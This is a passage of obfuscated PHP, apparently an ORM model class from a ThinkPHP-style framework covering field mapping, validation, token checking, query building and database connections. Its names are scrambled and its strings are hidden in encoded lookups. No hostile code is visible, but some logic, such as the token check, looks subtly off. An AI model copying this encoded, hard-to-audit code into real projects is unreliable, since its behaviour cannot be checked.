} if (empty($ˆ÷Ş¬°)) { return null; } $this->data = $ˆ÷Ş¬°[0]; $this->_afterFind($this->data, $”«¡àÍ´); if (!empty($this->options[$ßåÈ“Ì…[337]])) { return $this->returnResult($this->data, $this->options[$ßåÈ“Ì…[337]]); } return $this->data; } protected function _afterFind(&$éÃÊæ», $½¥²¶âé) { } protected function returnResult($úìû¨¬, $Ï‡•¢ŠÙ = '') { $¸’•à¦¿ =& $_SERVER[çâ¥×ø³]; if ($Ï‡•¢ŠÙ) { if (is_callable($Ï‡•¢ŠÙ)) { return call_user_func($Ï‡•¢ŠÙ, $úìû¨¬); } switch (strtolower($Ï‡•¢ŠÙ)) { case $¸’•à¦¿[338]: return json_encode($úìû¨¬); case $¸’•à¦¿[339]: return xml_encode($úìû¨¬); } } return $úìû¨¬; } public function parseFieldsMap($œ‘…¬Œ, $÷†…ª‘ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $©éìëê— => $ÁşÀèãî) { if ($÷†…ª‘ == 1) { if (isset($œ‘…¬Œ[$ÁşÀèãî])) { $œ‘…¬Œ[$©éìëê—] = $œ‘…¬Œ[$ÁşÀèãî]; unset($œ‘…¬Œ[$ÁşÀèãî]); } } else { if (isset($œ‘…¬Œ[$©éìëê—])) { $œ‘…¬Œ[$ÁşÀèãî] = $œ‘…¬Œ[$©éìëê—]; unset($œ‘…¬Œ[$©éìëê—]); } } } } return $œ‘…¬Œ; } public function setField($½¯øƒ¶Ë, $âãš×Ÿ‚ = '') { if (is_array($½¯øƒ¶Ë)) { $ÄÆÀ‡„» = $½¯øƒ¶Ë; } else { $ÄÆÀ‡„»[$½¯øƒ¶Ë] = $âãš×Ÿ‚; } return $this->save($ÄÆÀ‡„»); } public function setAdd($¼ŸÚİğ», $¢›ş›şç = 1) { $’§úáîä =& $_SERVER[çâ¥×ø³]; $¡šƒ”û = $¼ŸÚİğ» . $’§úáîä[340] . $¢›ş›şç; if ($¢›ş›şç < 0) { $¡šƒ”û = $¼ŸÚİğ» . $¢›ş›şç; } return $this->setField($¼ŸÚİğ», array($’§úáîä[341], $¡šƒ”û)); } public function getField($ ³”÷«©, $€… ÕÚú = null) { $áô€¡ƒ¬ =& $_SERVER[çâ¥×ø³]; $í¼¿ü„¹[$áô€¡ƒ¬[317]] = $ ³”÷«©; $í¼¿ü„¹ = $this->_parseOptions($í¼¿ü„¹); $ ³”÷«© = trim($ ³”÷«©); if (strpos($ ³”÷«©, $áô€¡ƒ¬[50])) { if (!isset($í¼¿ü„¹[$áô€¡ƒ¬[336]])) { $í¼¿ü„¹[$áô€¡ƒ¬[336]] = is_numeric($€… ÕÚú) ? $€… ÕÚú : $áô€¡ƒ¬[12]; } $¾„¾å¹¡ = $this->db->select($í¼¿ü„¹); if (!empty($¾„¾å¹¡)) { $‹†ØØÓç = explode($áô€¡ƒ¬[50], $ ³”÷«©); $ ³”÷«© = array_keys($¾„¾å¹¡[0]); $¼Ë‚Ä–Å = array_shift($ ³”÷«©); $Ó¯¦ˆşğ = array_shift($ ³”÷«©); $›¡œ«‘§ = array(); $êİúÔÊ¶ = count($‹†ØØÓç); foreach ($¾„¾å¹¡ as $èºß÷ğÀ) { $µ–Õ¹™Ø = $èºß÷ğÀ[$¼Ë‚Ä–Å]; if (2 == $êİúÔÊ¶) { $›¡œ«‘§[$µ–Õ¹™Ø] = $èºß÷ğÀ[$Ó¯¦ˆşğ]; } else { $›¡œ«‘§[$µ–Õ¹™Ø] = is_string($€… ÕÚú) ? implode($€… ÕÚú, $èºß÷ğÀ) : $èºß÷ğÀ; } } return $›¡œ«‘§; } } else { if (!0 !== $€… ÕÚú) { $í¼¿ü„¹[$áô€¡ƒ¬[336]] = is_numeric($€… ÕÚú) ? $€… ÕÚú : 1; } if ($€… ÕÚú === $áô€¡ƒ¬[299]) { unset($í¼¿ü„¹[$áô€¡ƒ¬[336]]); } $èºß÷ğÀ = $this->db->select($í¼¿ü„¹); if (!empty($èºß÷ğÀ)) { if ($€… ÕÚú === $áô€¡ƒ¬[299]) { return reset($èºß÷ğÀ[0]); } if (!0 !== $€… ÕÚú && 1 == $í¼¿ü„¹[$áô€¡ƒ¬[336]]) { return reset($èºß÷ğÀ[0]); } foreach ($èºß÷ğÀ as $…Ï±œŸ‡) { $Ğšş™òÅ[] = $…Ï±œŸ‡[$ ³”÷«©]; } return $Ğšş™òÅ; } } return null; } public function create($ç¬´åù = '', $¸—øµØè = '') { $æµàâ”³ =& $_SERVER[çâ¥×ø³]; if (empty($ç¬´åù)) { $ç¬´åù = $_POST; } elseif (is_object($ç¬´åù)) { $ç¬´åù = get_object_vars($ç¬´åù); } if (empty($ç¬´åù) || !is_array($ç¬´åù)) { $this->error = think_lang($æµàâ”³[315]); return !1; } $ç¬´åù = $this->parseFieldsMap($ç¬´åù, 0); $¸—øµØè = $¸—øµØè ? $¸—øµØè : (!empty($ç¬´åù[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$æµàâ”³[317]])) { $‹üÏïÛÇ = $this->options[$æµàâ”³[317]]; unset($this->options[$æµàâ”³[317]]); } elseif ($¸—øµØè == THINK_MODEL_INSERT && isset($this->insertFields)) { $‹üÏïÛÇ = $this->insertFields; } elseif ($¸—øµØè == THINK_MODEL_UPDATE && isset($this->updateFields)) { $‹üÏïÛÇ = $this->updateFields; } if (isset($‹üÏïÛÇ)) { if (is_string($‹üÏïÛÇ)) { $‹üÏïÛÇ = explode($æµàâ”³[50], $‹üÏïÛÇ); } if (think_config($æµàâ”³[342])) { $‹üÏïÛÇ[] = think_config($æµàâ”³[343]); } foreach ($ç¬´åù as $¿˜·æÎ => $ÀŒÒ×¦) { if (!in_array($¿˜·æÎ, $‹üÏïÛÇ)) { unset($ç¬´åù[$¿˜·æÎ]); } } } if (!$this->autoValidation($ç¬´åù, $¸—øµØè)) { return !1; } if (!$this->autoCheckToken($ç¬´åù)) { $this->error = think_lang($æµàâ”³[344]); return !1; } if ($this->autoCheckFields) { $‹üÏïÛÇ = $this->getDbFields(); foreach ($ç¬´åù as $¿˜·æÎ => $ÀŒÒ×¦) { if (!in_array($¿˜·æÎ, $‹üÏïÛÇ)) { unset($ç¬´åù[$¿˜·æÎ]); } elseif (MAGIC_QUOTES_GPC && is_string($ÀŒÒ×¦)) { $ç¬´åù[$¿˜·æÎ] = stripslashes($ÀŒÒ×¦); } } } $this->autoOperation($ç¬´åù, $¸—øµØè); $this->data = $ç¬´åù; return $ç¬´åù; } public function autoCheckToken($ò¬ë®ÒÜ) { $É‰ï½ùÀ =& $_SERVER[çâ¥×ø³]; if (isset($this->options[$É‰ï½ùÀ[345]]) && !$this->options[$É‰ï½ùÀ[345]]) { return !0; } if (think_config($É‰ï½ùÀ[342])) { $³‡²Êùı = think_config($É‰ï½ùÀ[343]); if (!isset($ò¬ë®ÒÜ[$³‡²Êùı]) || Session::get($³‡²Êùı)) { return !1; } list($×½„µÄæ, $–…Ö¶¸) = explode($É‰ï½ùÀ[11], $ò¬ë®ÒÜ[$³‡²Êùı]); if ($–…Ö¶¸ && Session::get($³‡²Êùı . $É‰ï½ùÀ[10] . $×½„µÄæ) === $–…Ö¶¸) { Session::remove($³‡²Êùı . $É‰ï½ùÀ[10] . $×½„µÄæ); return !0; } if (think_config($É‰ï½ùÀ[346])) { Session::remove($³‡²Êùı . $É‰ï½ùÀ[10] . $×½„µÄæ); } return !1; } return !0; } public function regex($½ŒæÙğ¬, $ôô˜ˆêë) { $ôŸ¬×†Ñ =& $_SERVER[çâ¥×ø³]; $ö¼Ø·ğò = array($ôŸ¬×†Ñ[347] => $ôŸ¬×†Ñ[348], $ôŸ¬×†Ñ[349] => $ôŸ¬×†Ñ[350], $ôŸ¬×†Ñ[351] => $ôŸ¬×†Ñ[352], $ôŸ¬×†Ñ[353] => $ôŸ¬×†Ñ[354], $ôŸ¬×†Ñ[355] => $ôŸ¬×†Ñ[356], $ôŸ¬×†Ñ[357] => $ôŸ¬×†Ñ[358], $ôŸ¬×†Ñ[359] => $ôŸ¬×†Ñ[360], $ôŸ¬×†Ñ[334] => $ôŸ¬×†Ñ[361], $ôŸ¬×†Ñ[362] => $ôŸ¬×†Ñ[363]); if (isset($ö¼Ø·ğò[strtolower($ôô˜ˆêë)])) { $ôô˜ˆêë = $ö¼Ø·ğò[strtolower($ôô˜ˆêë)]; } return preg_match($ôô˜ˆêë, $½ŒæÙğ¬) === 1; } private function autoOperation(&$óŸÔ÷Ûè, $ ÷Ì’Óê) { $Û—€Ò­ =& $_SERVER[çâ¥×ø³]; if (!empty($this->options[$Û—€Ò­[364]])) { $ÛÌµšÃø = $this->options[$Û—€Ò­[364]]; unset($this->options[$Û—€Ò­[364]]); } elseif (!empty($this->_auto)) { $ÛÌµšÃø = $this->_auto; } if (isset($ÛÌµšÃø)) { foreach ($ÛÌµšÃø as $ë©êÓŞË) { if (empty($ë©êÓŞË[2])) { $ë©êÓŞË[2] = THINK_MODEL_INSERT; } if ($ ÷Ì’Óê == $ë©êÓŞË[2] || $ë©êÓŞË[2] == THINK_MODEL_BOTH) { switch (trim($ë©êÓŞË[3])) { case $Û—€Ò­[365]: case $Û—€Ò­[366]: $‹œãì¦ = isset($ë©êÓŞË[4]) ? (array) $ë©êÓŞË[4] : array(); if (isset($óŸÔ÷Ûè[$ë©êÓŞË[0]])) { array_unshift($‹œãì¦, $óŸÔ÷Ûè[$ë©êÓŞË[0]]); } if ($Û—€Ò­[365] == $ë©êÓŞË[3]) { $óŸÔ÷Ûè[$ë©êÓŞË[0]] = call_user_func_array($ë©êÓŞË[1], $‹œãì¦); } else { $óŸÔ÷Ûè[$ë©êÓŞË[0]] = call_user_func_array(array(&$this, $ë©êÓŞË[1]), $‹œãì¦); } break; case $Û—€Ò­[317]: $óŸÔ÷Ûè[$ë©êÓŞË[0]] = $óŸÔ÷Ûè[$ë©êÓŞË[1]]; break; case $Û—€Ò­[367]: if ($Û—€Ò­[12] === $óŸÔ÷Ûè[$ë©êÓŞË[0]]) { unset($óŸÔ÷Ûè[$ë©êÓŞË[0]]); } break; case $Û—€Ò­[368]: default: $óŸÔ÷Ûè[$ë©êÓŞË[0]] = $ë©êÓŞË[1]; } if (!1 === $óŸÔ÷Ûè[$ë©êÓŞË[0]]) { unset($óŸÔ÷Ûè[$ë©êÓŞË[0]]); } } } } return $óŸÔ÷Ûè; } protected function autoValidation($‚¼ÉÚ‚î, $­èìç‡ù) { $‡ç¢ËÔâ =& $_SERVER[çâ¥×ø³]; if (!empty($this->options[$‡ç¢ËÔâ[369]])) { $óÆ­«¥ = $this->options[$‡ç¢ËÔâ[369]]; unset($this->options[$‡ç¢ËÔâ[369]]); } elseif (!empty($this->_validate)) { $óÆ­«¥ = $this->_validate; } if (isset($óÆ­«¥)) { if ($this->patchValidate) { $this->error = array(); } foreach ($óÆ­«¥ as $Œ¥ÌÂÔ¥ => $Üº²â˜) { if (empty($Üº²â˜[5]) || $Üº²â˜[5] == THINK_MODEL_BOTH || $Üº²â˜[5] == $­èìç‡ù) { if (0 == strpos($Üº²â˜[2], $‡ç¢ËÔâ[370]) && strpos($Üº²â˜[2], $‡ç¢ËÔâ[371])) { $Üº²â˜[2] = think_lang(substr($Üº²â˜[2], 2, -1)); } $Üº²â˜[3] = isset($Üº²â˜[3]) ? $Üº²â˜[3] : THINK_EXISTS_VALIDATE; $Üº²â˜[4] = isset($Üº²â˜[4]) ? $Üº²â˜[4] : $‡ç¢ËÔâ[372]; switch ($Üº²â˜[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($‚¼ÉÚ‚î, $Üº²â˜)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($‡ç¢ËÔâ[12] != trim($‚¼ÉÚ‚î[$Üº²â˜[0]])) { if (!1 === $this->_validationField($‚¼ÉÚ‚î, $Üº²â˜)) { return !1; } } break; default: if (isset($‚¼ÉÚ‚î[$Üº²â˜[0]])) { if (!1 === $this->_validationField($‚¼ÉÚ‚î, $Üº²â˜)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Æ‰»òµİ, $šÃÉ¶Õ) { if (!1 === $this->_validationFieldItem($Æ‰»òµİ, $šÃÉ¶Õ)) { if ($this->patchValidate) { $this->error[$šÃÉ¶Õ[0]] = $šÃÉ¶Õ[2]; } else { $this->error = $šÃÉ¶Õ[2]; return !1; } } return; } protected function _validationFieldItem($ú’ÀÔÇ¡, $ºİÖ¶çû) { $¹ãÜÇˆ– =& $_SERVER[çâ¥×ø³]; switch (strtolower(trim($ºİÖ¶çû[4]))) { case $¹ãÜÇˆ–[365]: case $¹ãÜÇˆ–[366]: $Îî»×¼¿ = isset($ºİÖ¶çû[6]) ? (array) $ºİÖ¶çû[6] : array(); if (is_string($ºİÖ¶çû[0]) && strpos($ºİÖ¶çû[0], $¹ãÜÇˆ–[50])) { $ºİÖ¶çû[0] = explode($¹ãÜÇˆ–[50], $ºİÖ¶çû[0]); } if (is_array($ºİÖ¶çû[0])) { foreach ($ºİÖ¶çû[0] as $ã»„È¸Œ) { $éï¸Ò›[$ã»„È¸Œ] = $ú’ÀÔÇ¡[$ã»„È¸Œ]; } array_unshift($Îî»×¼¿, $éï¸Ò›); } else { array_unshift($Îî»×¼¿, $ú’ÀÔÇ¡[$ºİÖ¶çû[0]]); } if ($¹ãÜÇˆ–[365] == $ºİÖ¶çû[4]) { return call_user_func_array($ºİÖ¶çû[1], $Îî»×¼¿); } else { return call_user_func_array(array(&$this, $ºİÖ¶çû[1]), $Îî»×¼¿); } case $¹ãÜÇˆ–[373]: return $ú’ÀÔÇ¡[$ºİÖ¶çû[0]] == $ú’ÀÔÇ¡[$ºİÖ¶çû[1]]; case $¹ãÜÇˆ–[374]: if (is_string($ºİÖ¶çû[0]) && strpos($ºİÖ¶çû[0], $¹ãÜÇˆ–[50])) { $ºİÖ¶çû[0] = explode($¹ãÜÇˆ–[50], $ºİÖ¶çû[0]); } $â–Ãªœ½ = array(); if (is_array($ºİÖ¶çû[0])) { foreach ($ºİÖ¶çû[0] as $ã»„È¸Œ) { $â–Ãªœ½[$ã»„È¸Œ] = $ú’ÀÔÇ¡[$ã»„È¸Œ]; } } else { $â–Ãªœ½[$ºİÖ¶çû[0]] = $ú’ÀÔÇ¡[$ºİÖ¶çû[0]]; } if (!empty($ú’ÀÔÇ¡[$this->getPk()])) { $â–Ãªœ½[$this->getPk()] = array($¹ãÜÇˆ–[375], $ú’ÀÔÇ¡[$this->getPk()]); } if ($this->where($â–Ãªœ½)->find()) { return !1; } return !0; default: return $this->check($ú’ÀÔÇ¡[$ºİÖ¶çû[0]], $ºİÖ¶çû[1], $ºİÖ¶çû[4]); } } public function check($‰ëÏí…, $ÙãŸùã, $ìñ¨‚×… = "\x72\x65\x67\x65\x78") { $¾€ôï¯ğ =& $_SERVER[çâ¥×ø³]; $ìñ¨‚×… = strtolower(trim($ìñ¨‚×…)); switch ($ìñ¨‚×…) { case $¾€ôï¯ğ[7]: case $¾€ôï¯ğ[376]: $‰£²Äìß = is_array($ÙãŸùã) ? $ÙãŸùã : explode($¾€ôï¯ğ[50], $ÙãŸùã); return $ìñ¨‚×… == $¾€ôï¯ğ[7] ? in_array($‰ëÏí…, $‰£²Äìß) : !in_array($‰ëÏí…, $‰£²Äìß); case $¾€ôï¯ğ[377]: case $¾€ôï¯ğ[378]: if (is_array($ÙãŸùã)) { $Íª³¡œ = $ÙãŸùã[0]; $«àßÉœç = $ÙãŸùã[1]; } else { list($Íª³¡œ, $«àßÉœç) = explode($¾€ôï¯ğ[50], $ÙãŸùã); } return $ìñ¨‚×… == $¾€ôï¯ğ[377] ? $‰ëÏí… >= $Íª³¡œ && $‰ëÏí… <= $«àßÉœç : $‰ëÏí… < $Íª³¡œ || $‰ëÏí… > $«àßÉœç; case $¾€ôï¯ğ[379]: case $¾€ôï¯ğ[380]: return $ìñ¨‚×… == $¾€ôï¯ğ[379] ? $‰ëÏí… == $ÙãŸùã : $‰ëÏí… != $ÙãŸùã; case $¾€ôï¯ğ[381]: $ª—ÎÜÜ = mb_strlen($‰ëÏí…, $¾€ôï¯ğ[382]); if (strpos($ÙãŸùã, $¾€ôï¯ğ[50])) { list($Íª³¡œ, $«àßÉœç) = explode($¾€ôï¯ğ[50], $ÙãŸùã); return $ª—ÎÜÜ >= $Íª³¡œ && $ª—ÎÜÜ <= $«àßÉœç; } else { return $ª—ÎÜÜ == $ÙãŸùã; } case $¾€ôï¯ğ[383]: list($„¥Ù…˜Ï, $½™™ÏƒŠ) = explode($¾€ôï¯ğ[50], $ÙãŸùã); if (!is_numeric($„¥Ù…˜Ï)) { $„¥Ù…˜Ï = strtotime($„¥Ù…˜Ï); } if (!is_numeric($½™™ÏƒŠ)) { $½™™ÏƒŠ = strtotime($½™™ÏƒŠ); } return NOW_TIME >= $„¥Ù…˜Ï && NOW_TIME <= $½™™ÏƒŠ; case $¾€ôï¯ğ[384]: return in_array(get_client_ip(), explode($¾€ôï¯ğ[50], $ÙãŸùã)); case $¾€ôï¯ğ[385]: return !in_array(get_client_ip(), explode($¾€ôï¯ğ[50], $ÙãŸùã)); case $¾€ôï¯ğ[372]: default: return $this->regex($‰ëÏí…, $ÙãŸùã); } } public function query($•¥ ä, $çÇí™›¢ = false) { $ÜøËÄÇ =& $_SERVER[çâ¥×ø³]; if (!is_bool($çÇí™›¢) && !is_array($çÇí™›¢)) { $çÇí™›¢ = func_get_args(); array_shift($çÇí™›¢); } $•¥ ä = str_replace(array($ÜøËÄÇ[246], $ÜøËÄÇ[386]), $ÜøËÄÇ[53], $•¥ ä); $•¥ ä = $this->parseSql($•¥ ä, $çÇí™›¢); return $this->db->query($•¥ ä); } public function execute($ãÉÅû°‰, $ƒÌÁŠÆ­ = false) { if (!is_bool($ƒÌÁŠÆ­) && !is_array($ƒÌÁŠÆ­)) { $ƒÌÁŠÆ­ = func_get_args(); array_shift($ƒÌÁŠÆ­); } $ãÉÅû°‰ = $this->parseSql($ãÉÅû°‰, $ƒÌÁŠÆ­); return $this->db->execute($ãÉÅû°‰); } protected function parseSql($™„Ş·ÙŠ, $²ªàî½à) { $¾Ê»²Ò =& $_SERVER[çâ¥×ø³]; if (!0 === $²ªàî½à) { $ ‹ßêüÖ = $this->_parseOptions(); $™„Ş·ÙŠ = $this->db->parseSql($™„Ş·ÙŠ, $ ‹ßêüÖ); } elseif (is_array($²ªàî½à)) { $²ªàî½à = array_map(array($this->db, $¾Ê»²Ò[387]), $²ªàî½à); $™„Ş·ÙŠ = vsprintf($™„Ş·ÙŠ, $²ªàî½à); } else { $™„Ş·ÙŠ = strtr($™„Ş·ÙŠ, array($¾Ê»²Ò[388] => $this->getTableName(), $¾Ê»²Ò[389] => think_config($¾Ê»²Ò[288]))); } $this->db->setModel($this->name); return $™„Ş·ÙŠ; } public function db($ÄèŞÂ© = '', $¦˜°ş“ğ = '', $Õ÷›ã§É = array()) { $©¦ÅãÉä =& $_SERVER[çâ¥×ø³]; if ($©¦ÅãÉä[12] === $ÄèŞÂ© && $this->db) { return $this->db; } static $€‚Äˆ÷œ = array(); static $öÂŞ÷û = array(); if (!isset($öÂŞ÷û[$ÄèŞÂ©]) || isset($öÂŞ÷û[$ÄèŞÂ©]) && $¦˜°ş“ğ && $€‚Äˆ÷œ[$ÄèŞÂ©] != $¦˜°ş“ğ) { if (!empty($¦˜°ş“ğ) && is_string($¦˜°ş“ğ) && !1 === strpos($¦˜°ş“ğ, $©¦ÅãÉä[8])) { $¦˜°ş“ğ = think_config($¦˜°ş“ğ); } $ÄèŞÂ© = think_guid($¦˜°ş“ğ); $öÂŞ÷û[$ÄèŞÂ©] = Db::getInstance($¦˜°ş“ğ); } elseif (NULL === $¦˜°ş“ğ) { $öÂŞ÷û[$ÄèŞÂ©]->close(); unset($öÂŞ÷û[$ÄèŞÂ©]); return; } if (!empty($Õ÷›ã§É)) { if (is_string($Õ÷›ã§É)) { parse_str($Õ÷›ã§É, $Õ÷›ã§É); } foreach ($Õ÷›ã§É as $ÃãÁÊŸ» => $ïÍò¿ßä) { $this->setProperty($ÃãÁÊŸ», $ïÍò¿ßä); } } $€‚Äˆ÷œ[$ÄèŞÂ©] = $¦˜°ş“ğ; $this->db = $öÂŞ÷û[$ÄèŞÂ©]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $‹ÎÙÔòå = get_class($this); if ($‹ÎÙÔòå == $_SERVER[çâ¥×ø³][390]) { return $this->name; } $this->name = substr($‹ÎÙÔòå, 0, -5); } return $this->name; } public function getTableName() { $¯Ø÷‚’» =& $_SERVER[çâ¥×ø³]; if (empty($this->trueTableName)) { $ ½Ç‚øë = !empty($this->tablePrefix) ? $this->tablePrefix : $¯Ø÷‚’»[12]; if (!empty($this->tableName)) { $ ½Ç‚øë .= $this->tableName; } else { $ ½Ç‚øë .= think_parse_name($this->name); } $this->trueTableName = strtolower($ ½Ç‚øë); } return (!empty($this->dbName) ? $this->dbName . $¯Ø÷‚’»[10] : $¯Ø÷‚’»[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $âê›£“£ =& $_SERVER[çâ¥×ø³]; return isset($this->fields[$âê›£“£[295]]) ? $this->fields[$âê›£“£[295]] : $this->pk; } public function getDbFields() { $§«ë§‡¼ =& $_SERVER[çâ¥×ø³]; if (isset($this->options[$§«ë§‡¼[323]])) { $Õƒˆã• = $this->db->getFields($this->options[$§«ë§‡¼[323]]); return $Õƒˆã• ? array_keys($Õƒˆã•) : !1; } if ($this->fields) { $Õƒˆã• = $this->fields; unset($Õƒˆã•[$§«ë§‡¼[294]], $Õƒˆã•[$§«ë§‡¼[295]], $Õƒˆã•[$§«ë§‡¼[296]], $Õƒˆã•[$§«ë§‡¼[293]]); return $Õƒˆã•; } return !1; } public function data($é£äæé = '') { $ÆË‡ˆì =& $_SERVER[çâ¥×ø³]; if ($ÆË‡ˆì[12] === $é£äæé && !empty($this->data)) { return $this->data; } if (is_object($é£äæé)) { $é£äæé = get_object_vars($é£äæé); } elseif (is_string($é£äæé)) { parse_str($é£äæé, $é£äæé); } elseif (!is_array($é£äæé)) { think_exception(think_lang($ÆË‡ˆì[315])); } $this->data = $é£äæé; return $this; } public function join($Õîâ˜¡©) { $¨¦èÓ«× =& $_SERVER[çâ¥×ø³]; if (is_array($Õîâ˜¡©)) { $this->options[$¨¦èÓ«×[326]] = $Õîâ˜¡©; } elseif (!empty($Õîâ˜¡©)) { $this->options[$¨¦èÓ«×[326]][] = $Õîâ˜¡©; } return $this; } public function union($È•´¢ö, $˜›øÌ = false) { $…øĞ¸ú =& $_SERVER[çâ¥×ø³]; if (empty($È•´¢ö)) { return $this; } if ($˜›øÌ) { $this->options[$…øĞ¸ú[391]][$…øĞ¸ú[392]] = !0; } if (is_object($È•´¢ö)) { $È•´¢ö = get_object_vars($È•´¢ö); } if (is_string($È•´¢ö)) { $´ºŠ¿¸™ = $È•´¢ö; } elseif (is_array($È•´¢ö)) { if (isset($È•´¢ö[0])) { $this->options[$…øĞ¸ú[391]] = array_merge($this->options[$…øĞ¸ú[391]], $È•´¢ö); return $this; } else { $´ºŠ¿¸™ = $È•´¢ö; } } else { think_exception(think_lang($…øĞ¸ú[315])); } $this->options[$…øĞ¸ú[391]][] = $´ºŠ¿¸™; return $this; } public function cache($½ÊÚ‹œö = true, $ñ‰íáÇ“ = null, $ßÖ÷ƒªš = '') { $ì†õı»¹ =& $_SERVER[çâ¥×ø³]; if (!1 !== $½ÊÚ‹œö) { $this->options[$ì†õı»¹[393]] = array($ì†õı»¹[94] => $½ÊÚ‹œö, $ì†õı»¹[383] => $ñ‰íáÇ“, $ì†õı»¹[33] => $ßÖ÷ƒªš); } return $this; } public function field($¶ºÂâŠ, $áõç©¦ş = false) { $ÑİÚ›Óı =& $_SERVER[çâ¥×ø³]; if (!0 === $¶ºÂâŠ) { $ÉƒµåÇ¦ = $this->getDbFields(); $¶ºÂâŠ = $ÉƒµåÇ¦ ? $ÉƒµåÇ¦ : $ÑİÚ›Óı[203]; } elseif ($áõç©¦ş) { if (is_string($¶ºÂâŠ)) { $¶ºÂâŠ = explode($ÑİÚ›Óı[50], $¶ºÂâŠ); } $ÉƒµåÇ¦ = $this->getDbFields(); $¶ºÂâŠ = $ÉƒµåÇ¦ ? array_diff($ÉƒµåÇ¦, $¶ºÂâŠ) : $¶ºÂâŠ; } $this->options[$ÑİÚ›Óı[317]] = $¶ºÂâŠ; return $this; } public function scope($èˆ·‡×Ü = '', $üšµÅ£Ò = NULL) { $“è—òó¿ =& $_SERVER[çâ¥×ø³]; if ($“è—òó¿[12] === $èˆ·‡×Ü) { if (isset($this->_scope[$“è—òó¿[37]])) { $ä¼ÔØË = $this->_scope[$“è—òó¿[37]]; } else { return $this; } } elseif (is_string($èˆ·‡×Ü)) { $Æ×êÁ„¥ = explode($“è—òó¿[50], $èˆ·‡×Ü); $ä¼ÔØË = array(); foreach ($Æ×êÁ„¥ as $Åˆé—éº) { if (!isset($this->_scope[$Åˆé—éº])) { continue; } $ä¼ÔØË = array_merge($ä¼ÔØË, $this->_scope[$Åˆé—éº]); } if (!empty($üšµÅ£Ò) && is_array($üšµÅ£Ò)) { $ä¼ÔØË = array_merge($ä¼ÔØË, $üšµÅ£Ò); } } elseif (is_array($èˆ·‡×Ü)) { $ä¼ÔØË = $èˆ·‡×Ü; } if (is_array($ä¼ÔØË) && !empty($ä¼ÔØË)) { $this->options = array_merge($this->options, array_change_key_case($ä¼ÔØË)); } return $this; } public function where($”Ãä­¶, $şªµ‰å = null) { $×ÁìÙÍ¼ =& $_SERVER[çâ¥×ø³]; if (!is_null($şªµ‰å) && is_string($”Ãä­¶)) { if (!is_array($şªµ‰å)) { $şªµ‰å = func_get_args(); array_shift($şªµ‰å); } $şªµ‰å = array_map(array($this->db, $×ÁìÙÍ¼[387]), $şªµ‰å); $”Ãä­¶ = vsprintf($”Ãä­¶, $şªµ‰å); } elseif (is_object($”Ãä­¶)) { $”Ãä­¶ = get_object_vars($”Ãä­¶); } elseif (is_array($”Ãä­¶)) { foreach ($”Ãä­¶ as $èÍ›‘Øô => $‡á²¬ƒ–) { if ((is_numeric($èÍ›‘Øô) || !$èÍ›‘Øô) && is_string($‡á²¬ƒ–)) { if (strpos($‡á²¬ƒ–, $×ÁìÙÍ¼[394]) === 0) { continue; } think_trace($×ÁìÙÍ¼[395], $×ÁìÙÍ¼[12], $×ÁìÙÍ¼[49]); die; } } } if (is_string($”Ãä­¶) && $×ÁìÙÍ¼[12] != $”Ãä­¶) { $¾›Ã „ = array(); $¾›Ã „[$×ÁìÙÍ¼[396]] = $”Ãä­¶; $”Ãä­¶ = $¾›Ã „; } if (isset($this->options[$×ÁìÙÍ¼[319]])) { $this->options[$×ÁìÙÍ¼[319]] = array_merge($this->options[$×ÁìÙÍ¼[319]], $”Ãä­¶); } else { $this->options[$×ÁìÙÍ¼[319]] = $”Ãä­¶; } return $this; } public function limit($´¾ÕÇû£, $÷¼¬®¬ = null) { $¢ÍØıä¨ =& $_SERVER[çâ¥×ø³]; $this->options[$¢ÍØıä¨[336]] = is_null($÷¼¬®¬) ? $´¾ÕÇû£ : $´¾ÕÇû£ . $¢ÍØıä¨[50] . $÷¼¬®¬; return $this; } public function page($Ÿ‘èÌ„¸, $êâË“Š“ = null) { $à¦¼²ğ =& $_SERVER[çâ¥×ø³]; $this->options[$à¦¼²ğ[397]] = is_null($êâË“Š“) ? $Ÿ‘èÌ„¸ : $Ÿ‘èÌ„¸ . $à¦¼²ğ[50] . $êâË“Š“; return $this; } public function comment($ç°øÁß) { $this->options[$_SERVER[çâ¥×ø³][398]] = $ç°øÁß; return $this; } public function setProperty($ö«ã¬«„, $ªãéÃœ) { if (property_exists($this, $ö«ã¬«„)) { $this->{$ö«ã¬«„} = $ªãéÃœ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\151\146\x79\124\x69\x6d\x65", "\x74\x69\155\145", "\151\x6e\x73\145\x72\164\54\165\x70\x64\x61\164\x65", "\x66\165\156\x63\164\x69\157\x6e"), array("\x63\162\x65\141\164\145\124\151\x6d\145", "\164\x69\x6d\x65", "\151\x6e\163\145\x72\x74", "\146\x75\x6e\x63\x74\x69\157\156")); public function setDataAuto($¾öÃÅ¼±) { $this->dataAuto = $¾öÃÅ¼±; } public function __construct($´ı³ÏÛÉ = '', $¥Ä¡İ£ = '', $­ùË”¾ = '') { parent::__construct($´ı³ÏÛÉ, $¥Ä¡İ£, $­ùË”¾); } protected $tableMeta = array(); protected function _beforeInsert(&$ÌÈÀÑ Ô, $ßØ·™ÌÎ) { $êÅãõÊÙ =& $_SERVER[çâ¥×ø³]; if (!$this->checkDataAutoHas($êÅãõÊÙ[399])) { return; } $this->dataBeforeFilter($ÌÈÀÑ Ô, $êÅãõÊÙ[399]); } protected function _beforeUpdate(&$ó“…Î³, $‘€µÖ²Ÿ) { $·‚ßŠš =& $_SERVER[çâ¥×ø³]; if (!$this->checkDataAutoHas($·‚ßŠš[400])) { return; } $this->dataBeforeFilter($ó“…Î³, $·‚ßŠš[400]); } protected function _afterSelect(&$‰ÔôŸå¼, $õ‘¿–«) { if (!is_array($‰ÔôŸå¼)) { return; } if 